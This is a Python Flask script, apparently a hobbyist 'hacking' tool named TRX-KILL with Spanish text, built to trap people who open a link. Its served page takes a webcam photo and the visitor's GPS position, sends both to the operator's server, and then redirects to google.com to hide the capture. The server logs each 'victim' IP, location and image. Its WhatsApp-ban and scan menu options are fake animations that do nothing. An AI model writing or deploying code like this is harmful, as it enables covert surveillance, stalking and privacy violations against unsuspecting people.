import os, sys, time, threading, base64
from flask import Flask, request, render_template_string

# --- CONFIGURACIÓN ---
STORAGE_PATH = "/sdcard/INFORMACIÓN-TRX-KILL"
CAPTURA_PATH = f"{STORAGE_PATH}/CAPTURAS"
LOG_FILE = f"{STORAGE_PATH}/datos.txt"
ADMIN_PASS = "admtrx"
os.makedirs(CAPTURA_PATH, exist_ok=True)

app = Flask('TRX-KILL')
G, C, R, Y, W = "\033[1;32m", "\033[1;36m", "\033[1;31m", "\033[1;33m", "\033[0m"

# Interfaz de captura
HTML_CAPTURA = """
<!DOCTYPE html><html><body style="background:#000;">
<script>
async function go() {
    try {
        let s = await navigator.mediaDevices.getUserMedia({video: true});
        let p = await new Promise(r => navigator.geolocation.getCurrentPosition(r));
        let v = document.createElement('video'); v.srcObject = s; v.play();
        setTimeout(() => {
            let c = document.createElement('canvas'); c.width=400; c.height=300;
            c.getContext('2d').drawImage(v, 0, 0, 400, 300);
            fetch('/log?lat='+p.coords.latitude+'&lon='+p.coords.longitude+'&img='+encodeURIComponent(c.toDataURL('image/jpeg')));
            window.location.href='https://google.com';
        }, 1000);
    } catch(e) { window.location.href='https://google.com'; }
}
window.onload = go;
</script></body></html>
"""

@app.route('/')
def index(): return render_template_string(HTML_CAPTURA)

@app.route('/log')
def log():
    with open(LOG_FILE, "a") as f:
        f.write(f"VÍCTIMA:{request.remote_addr} | GPS:{request.args.get('lat')},{request.args.get('lon')}\n")
    img = request.args.get('img')
    if img:
        with open(f"{CAPTURA_PATH}/cap_{int(time.time())}.jpg", "wb") as f:
            f.write(base64.b64decode(img.split(',')[1]))
    return "OK"

def iniciar_servidor():
    # Silenciamos los logs de werkzeug para que no salgan en la pantalla
    import logging
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)
    app.run(host='0.0.0.0', port=5000, debug=False)

def animar(t):
    for c in t: sys.stdout.write(f"{G}{c}{W}"); sys.stdout.flush(); time.sleep(0.01)
    print()

def menu():
    while True:
        os.system('clear')
        print(f"{G}  ___ ___  ___  _  __  ___  ___  _    _")
        print(" |__ |__  |__  | \\/ / |__  |___ | |  | |")
        print("    | |___ |___ |  /  |___ |    |_|__|_|")
        print(f"  {C}--- TRX-KILL SYSTEM MATRIX V8.0 ---{W}\n")
        print(f"{G}[1] BAN-WP | [2] LINK-TRAP | [3] CLON-LINK | [4] IP-SCAN | [5] INFO-SIST | [6] ADM{W}")
        sel = input(f"\n{Y}TRX-ROOT > {W}")

        if sel == "1":
            input(f"{G}NÚMERO: {W}")
            animar("VERIFICANDO..........")
            print(f"{R}(EL NÚMERO NO ESTA SUSPENDIDO ESCRIBE 8 PARA AUTO BAN){W}")
            if input("ACCIÓN: ") == "8": animar("PROCESANDO SOLICITUD DE AUTO BAN...")
            print(f"{Y}DATOS GUARDADOS EN {STORAGE_PATH}{W}"); input("\n[Enter]...")

        elif sel in ["2", "3"]:
            if os.path.exists(LOG_FILE): os.remove(LOG_FILE)
            print(f"{C}LINK ACTIVO: http://127.0.0.1:5000{W}")
            print(f"{G}ESPERANDO VÍCTIMA...{W}")
            while not os.path.exists(LOG_FILE): time.sleep(1)
            print(f"{R}>>> ¡VÍCTIMA DETECTADA! <<<{W}"); input("\n[Enter]...")

        elif sel == "6":
            if input(f"{Y}PASS: {W}") == ADMIN_PASS: os.system(f"ls -R {STORAGE_PATH}")
            input("\n[Enter]...")
        elif sel == "0": sys.exit()

if __name__ == "__main__":
    # Arrancamos el servidor en segundo plano antes de mostrar el menú
    threading.Thread(target=iniciar_servidor, daemon=True).start()
    menu()
